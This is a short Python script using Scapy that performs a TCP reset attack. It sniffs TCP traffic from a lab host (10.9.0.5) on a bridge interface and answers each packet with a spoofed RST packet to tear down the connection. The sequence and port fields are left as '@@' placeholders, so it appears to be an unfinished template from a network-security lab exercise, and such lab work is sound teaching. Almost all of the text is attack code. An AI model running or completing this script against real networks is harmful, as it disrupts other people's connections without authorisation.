#!/usr/bin/python3
from scapy.all import *
from time import *

sleep(5)

IP_src = '10.9.0.5'
my_iface = 'br-8ff0bf6fedc6'
my_filtering = 'tcp and src host {A}'.format(A=IP_src)

def spoof_tcp(pkt):
      IP_layer = IP( dst=IP_src, src=pkt[IP].dst )
      TCP_layer = TCP( flags="R", seq=@@, dport=@@, sport=@@ )
      spoof_pkt = IP_layer/TCP_layer
      send( spoof_pkt, verbose=0 )

pkt = sniff(iface=my_iface, filter=my_filtering, prn=spoof_tcp)
